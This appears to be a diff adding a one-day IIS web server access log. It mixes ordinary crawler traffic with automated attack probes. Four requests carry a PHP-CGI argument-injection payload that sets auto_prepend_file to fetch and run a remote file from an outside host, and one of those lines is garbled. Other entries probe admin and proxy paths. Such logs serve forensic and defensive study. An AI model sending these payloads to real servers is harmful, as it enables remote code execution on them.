@@ -1,0 +1,73 @@
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 03:35:52
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 03:35:52 172.31.22.76 GET / - 80 - 137.226.113.7 Mozilla/5.0+(Macintosh;+Intel+Mac+OS+X+10_11_1)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/46.0.2490.86+Safari/537.36+Scanning+for+research+(researchscan.comsys.rwth-aachen.de) - 200 0 64 2316
+2016-03-12 03:45:57 172.31.22.76 GET /cgi-bin/php5 -d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin2.106672E-315simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp0X0.0000000A076AP-10220.0000000.00000089.248.160.1320.000000ok.txt+-d+cgi1.057300E-321force_redirect%3D0+-d+cgi2.110035E-315redirect_status_env%3D0+-n 80 - 89.248.160.132 - - 404 0 2 176
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 06:57:37
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 06:57:37 172.31.22.76 GET /robots.txt - 80 - 66.249.66.126 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 0 2 312
+2016-03-12 06:57:37 172.31.22.76 GET / - 80 - 66.249.66.124 Mozilla/5.0+AppleWebKit/537.36+(KHTML,+like+Gecko;+Google+Web+Preview+Analytics)+Chrome/27.0.1453+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 200 0 0 814
+2016-03-12 06:57:39 172.31.22.76 GET /assets/css/mainStylesheet.css - 80 - 66.249.66.124 Mozilla/5.0+AppleWebKit/537.36+(KHTML,+like+Gecko;+Google+Web+Preview+Analytics)+Chrome/27.0.1453+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://www.know-it.pe/ 200 0 0 84
+2016-03-12 06:57:39 172.31.22.76 GET /tools/960.css - 80 - 66.249.66.122 Mozilla/5.0+AppleWebKit/537.36+(KHTML,+like+Gecko;+Google+Web+Preview+Analytics)+Chrome/27.0.1453+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://www.know-it.pe/ 200 0 0 79
+2016-03-12 06:57:39 172.31.22.76 GET /tools/style.css - 80 - 66.249.66.122 Mozilla/5.0+AppleWebKit/537.36+(KHTML,+like+Gecko;+Google+Web+Preview+Analytics)+Chrome/27.0.1453+Safari/537.36+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://www.know-it.pe/ 200 0 0 79
+2016-03-12 07:03:46 172.31.22.76 GET /cgi-bin/php -d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://hecks.ddosdev.net/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n 80 - 89.248.160.132 - - 404 0 2 172
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 07:31:52
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 07:31:52 172.31.22.76 GET /tools/960.css - 80 - 66.249.66.122 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://www.know-it.pe/ 200 0 0 127
+2016-03-12 07:31:52 172.31.22.76 GET /assets/css/mainStylesheet.css - 80 - 66.249.66.122 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://www.know-it.pe/ 200 0 0 78
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 08:40:34
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 08:40:34 172.31.22.76 GET /testproxy.php - 80 - 185.25.151.159 Mozilla/5.0+(Windows+NT+5.1;+rv:32.0)+Gecko/20100101+Firefox/31.0 - 404 0 2 239
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 12:50:21
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 12:50:21 172.31.22.76 HEAD / - 80 - 54.196.104.181 Cloud+mapping+experiment.+Contact+research@pdrlabs.net - 200 0 0 909
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 13:57:55
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 13:57:55 172.31.22.76 GET /cgi-bin/php -d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://hecks.ddosdev.net/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n 80 - 89.248.160.132 - - 404 0 2 289
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 14:50:30
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 14:50:30 172.31.22.76 GET /manager/html - 80 - 202.109.143.18 Mozilla/3.0+(compatible;+Indy+Library) - 404 0 2 502
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 18:11:13
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 18:11:13 172.31.22.76 GET /xmlrpc.php - 80 - 5.135.17.28 - - 404 0 2 271
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 18:31:33
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 18:31:33 172.31.22.76 HEAD / - 80 - 188.42.225.214 - - 200 0 64 348
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 18:57:16
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 18:57:16 172.31.22.76 GET / - 80 - 173.252.122.119 - - 200 0 0 199
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 21:06:28
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 21:06:28 172.31.22.76 GET /cgi-bin/php5 -d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://hecks.ddosdev.net/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n 80 - 89.248.160.132 - - 404 0 2 435
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 22:24:08
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 22:24:08 172.31.22.76 GET /robots.txt - 80 - 66.249.74.56 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) - 404 0 2 58
+2016-03-12 22:24:08 172.31.22.76 GET /tools/style.css - 80 - 66.249.74.54 Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html) http://www.know-it.pe/ 200 0 0 17
+#Software: Microsoft Internet Information Services 8.5
+#Version: 1.0
+#Date: 2016-03-12 23:55:17
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2016-03-12 23:55:17 172.31.22.76 HEAD / - 80 - 23.95.95.236 - - 200 0 0 183
